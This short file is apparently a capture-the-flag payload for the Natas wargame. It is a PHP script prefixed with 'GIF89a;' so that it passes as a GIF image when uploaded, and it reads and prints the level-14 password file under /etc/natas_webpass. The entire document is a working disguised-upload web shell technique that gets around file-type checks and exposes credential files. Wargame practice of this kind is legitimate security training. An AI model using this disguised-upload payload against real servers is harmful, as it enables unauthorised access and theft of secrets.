GIF89a;

<?php
$filename = '/etc/natas_webpass/natas14';

$content = file_get_contents($filename);

if ($content !== false) {
    echo $content;
} else {
    echo "Error: Could not read file.";
}
?>